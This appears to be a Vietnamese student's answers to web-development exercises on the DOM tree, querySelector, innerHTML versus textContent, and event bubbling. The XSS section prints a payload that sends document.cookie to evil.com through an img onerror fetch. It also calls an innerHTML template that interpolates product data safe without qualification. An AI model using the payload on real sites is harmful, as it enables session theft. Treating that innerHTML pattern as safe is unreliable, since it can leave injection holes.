## PHẦN A

Câu A1:

---

### 1. Sơ đồ cây DOM

```
document
└── html
    └── body
        └── div#app
            ├── header
            │   ├── h1
            │   │   └── "Todo App"
            │   └── nav
            │       ├── a.active
            │       │   └── "All"
            │       ├── a
            │       │   └── "Active"
            │       └── a
            │           └── "Completed"
            └── main
                ├── form#todoForm
                │   ├── input#todoInput [type="text"]
                │   └── button [type="submit"]
                │       └── "Add"
                └── ul#todoList
                    ├── li.todo-item
                    │   └── "Learn HTML"
                    └── li.todo-item.completed
                        └── "Learn CSS"
```

---

### 2. querySelector

```js
// Chọn thẻ <h1>
document.querySelector("h1");

// Chọn input trong form
document.querySelector("#todoForm input");

// Chọn tất cả .todo-item
document.querySelectorAll(".todo-item");

// Chọn link đang active
document.querySelector("a.active");

// Chọn <li> đầu tiên trong #todoList
document.querySelector("#todoList li:first-child");

// Chọn tất cả <a> bên trong <nav>
document.querySelectorAll("nav a");
```

Câu A2:

---

## So sánh

|             | `innerHTML`                   | `textContent`                 |
| ----------- | ----------------------------- | ----------------------------- |
| **Đọc**     | Trả về HTML kể cả thẻ tag     | Trả về text thuần, bỏ hết tag |
| **Ghi**     | Parse và render HTML          | Ghi thẳng chuỗi, không parse  |
| **Tốc độ**  | Chậm hơn (phải parse DOM)     | Nhanh hơn                     |
| **Bảo mật** | ⚠️ Nguy hiểm với dữ liệu user | ✅ An toàn                    |

---

## Ví dụ minh họa

```js
const el = document.querySelector("#box");

// innerHTML → render thẻ HTML
el.innerHTML = "<strong>Hello</strong>"; // hiện chữ đậm: Hello

// textContent → hiện nguyên chuỗi
el.textContent = "<strong>Hello</strong>"; // hiện literal: <strong>Hello</strong>
```

---

## Khi nào dùng cái nào?

**Dùng `innerHTML`** khi bạn tự tạo HTML, không phụ thuộc input của user:

```js
// ✅ An toàn vì string là do dev tự viết
container.innerHTML = `
  <div class="card">
    <h2>${product.name}</h2>
    <p>${product.price}</p>
  </div>
`;
```

**Dùng `textContent`** khi hiển thị dữ liệu từ user hoặc API:

```js
// ✅ An toàn dù user nhập gì
document.querySelector("#username").textContent = user.name;
document.querySelector("#result").textContent = searchQuery;
```

---

## Lỗ hổng XSS với innerHTML

### XSS là gì?

**Cross-Site Scripting (XSS)**: kẻ tấn công inject code JS độc hại vào trang web, trình duyệt của nạn nhân sẽ thực thi đoạn code đó.

### Ví dụ tấn công

```js
// User nhập vào ô tìm kiếm:
// <img src=x onerror="alert('Hacked!')">

const userInput = document.querySelector("#search").value;
document.querySelector("#result").innerHTML = userInput;
// ↑ Trình duyệt parse HTML → tạo thẻ <img>
//   src=x không load được → kích hoạt onerror
//   → alert() chạy
//   Thực tế: thay alert() bằng code đánh cắp cookie, redirect, v.v.
```

### Hậu quả thực tế

```js
// Kẻ tấn công có thể inject:
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

// → đánh cắp toàn bộ cookie (session, auth token...)
```

---

Câu A3:

---

### Output khi click button (bình thường)

```
BUTTON
INNER
OUTER
```

Event nổi bọt từ phần tử được click lên các phần tử cha theo thứ tự:

```
button#btn  →  div#inner  →  div#outer  →  body  →  html  →  document
   ↓               ↓              ↓
"BUTTON"        "INNER"        "OUTER"
```

---

### Output khi uncomment `e.stopPropagation()`

```
BUTTON
```

`stopPropagation()` dừng event tại `#btn`, không cho nổi bọt lên `#inner` và `#outer` nữa.

---

### Giải thích cơ chế Event Bubbling

Khi click vào một phần tử, trình duyệt xử lý event theo 3 phase:

```
1. CAPTURE (đi xuống):  document → html → body → #outer → #inner → #btn
2. TARGET:              #btn xử lý event
3. BUBBLE (đi lên):    #btn → #inner → #outer → body → html → document
```

Mặc định `addEventListener` lắng nghe ở phase **BUBBLE** (phase 3).  
Muốn lắng nghe ở phase CAPTURE thêm `true` làm tham số thứ 3:

```js
element.addEventListener("click", handler, true); // capture phase
```

---

### Các phương thức kiểm soát Event

| Phương thức                    | Tác dụng                                                                         |
| ------------------------------ | -------------------------------------------------------------------------------- |
| `e.stopPropagation()`          | Dừng bubble, event không lan lên phần tử cha                                     |
| `e.stopImmediatePropagation()` | Dừng bubble VÀ dừng các listener khác trên cùng phần tử                          |
| `e.preventDefault()`           | Hủy hành động mặc định (submit form, follow link...) nhưng **không** dừng bubble |

---
